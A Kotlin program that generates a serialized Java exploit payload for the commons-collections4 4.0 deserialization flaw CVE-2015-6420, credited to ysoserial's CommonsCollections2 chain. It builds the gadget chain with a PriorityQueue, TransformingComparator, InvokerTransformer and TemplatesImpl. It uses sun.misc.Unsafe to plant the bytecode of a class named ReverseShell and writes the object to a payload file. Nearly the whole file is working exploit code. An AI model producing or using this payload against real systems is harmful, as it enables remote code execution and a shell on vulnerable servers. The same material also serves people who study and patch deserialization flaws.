@file:Suppress("SpellCheckingInspection")

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl
import org.apache.commons.collections4.comparators.TransformingComparator
import org.apache.commons.collections4.functors.InvokerTransformer
import sun.misc.Unsafe
import java.io.File
import java.io.FileOutputStream
import java.io.ObjectOutputStream
import java.util.*

fun main() {
    ObjectOutputStream(FileOutputStream("../payload.sbin")).use {
        it.writeObject(makePayloadObject())
    }
}

/*
    Vulnerability: https://advisory.checkmarx.net/advisory/vulnerability/CVE-2015-6420/ in org.apache.commons:commons-collections4:4.0
    Credits: https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
						    ...
							    <clinit> (static initializer) call our class
 */
fun makePayloadObject(): Any {
    val transformer = InvokerTransformer<Any?, Any?>("toString", arrayOf(), arrayOf())
    val queue = PriorityQueue(2, TransformingComparator(transformer))
    queue.add(42)
    queue.add(42)
    InvokerTransformer::class.java.getDeclaredField("iMethodName").apply {
        isAccessible = true
    }.set(transformer, "newTransformer")
    val objs = queue.unsafeGetObjectField<Array<Any?>>("queue")
    objs[0] = makePayloadContainer()
    return queue
}

fun makePayloadContainer(): TemplatesImpl {
    val templates = TemplatesImpl()
    val classFile = System.getProperty("java.class.path").split(';').firstNotNullOf {
        val file = File(it, "ReverseShell.class")
        if(file.exists()) file else null
    }
    templates.unsafeSetObjectField("_bytecodes", arrayOf(classFile.readBytes()))
    templates.unsafeSetObjectField("_name", "ReverseShell")
    templates.unsafeSetObjectField("_tfactory", TransformerFactoryImpl())
    return templates
}

// we could use reflection or method handles, but I prefer this way
val unsafe = Unsafe::class.java.getDeclaredField("theUnsafe").also { it.isAccessible = true }.get(null) as Unsafe

fun Any.unsafeSetObjectField(name: String, value: Any) {
    val offset = unsafe.objectFieldOffset(javaClass.getDeclaredField(name))
    unsafe.putObject(this, offset, value)
}

fun <T> Any.unsafeGetObjectField(name: String): T {
    val offset = unsafe.objectFieldOffset(javaClass.getDeclaredField(name))
    @Suppress("Unchecked_Cast")
    return unsafe.getObject(this, offset) as T
}